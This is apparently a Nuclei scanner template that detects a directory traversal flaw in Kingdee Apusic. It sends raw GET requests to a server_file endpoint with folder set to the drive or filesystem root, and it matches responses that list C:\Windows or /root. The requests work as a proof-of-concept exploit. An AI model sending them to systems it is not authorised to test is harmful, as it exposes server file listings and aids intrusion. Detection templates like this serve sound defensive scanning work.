id: kingdee-apusic-directory-traversal
info:
  name: Kingdee Apusic Directory Traversal
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects directory traversal vulnerabilities in Kingdee Apusic by checking if specific file paths are exposed in the response.
  reference:
    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
variables:
  paths:
    - "admin"
    - "appmonitor"
http:
  - raw:
      - |
        GET /{{paths}}/protected/selector/server_file/files?folder=C://&suffix= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
        Accept: */*
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "{\"name\":\"Windows\",\"path\":\"C:\\\\Windows\",\"folder\":true}"
  - raw:
      - |
        GET /{{paths}}/protected/selector/server_file/files?folder=/&suffix= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
        Accept: */*
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}"
stop-at-first-match: true
